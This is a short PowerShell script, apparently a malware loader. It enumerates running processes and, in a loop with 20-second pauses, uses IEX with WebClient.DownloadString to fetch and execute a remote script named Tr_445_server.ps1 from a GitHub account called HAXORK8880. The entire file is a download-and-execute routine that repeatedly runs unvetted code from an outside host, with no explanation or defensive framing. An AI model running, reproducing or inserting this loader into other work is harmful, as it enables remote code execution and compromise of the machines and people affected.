$processes = Get-Process

$i = 1
ForEach ($process in $processes) {

    Start-Sleep -Seconds 20
    IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/servers/main/Tr_445_server.ps1')
    $i++
   
}
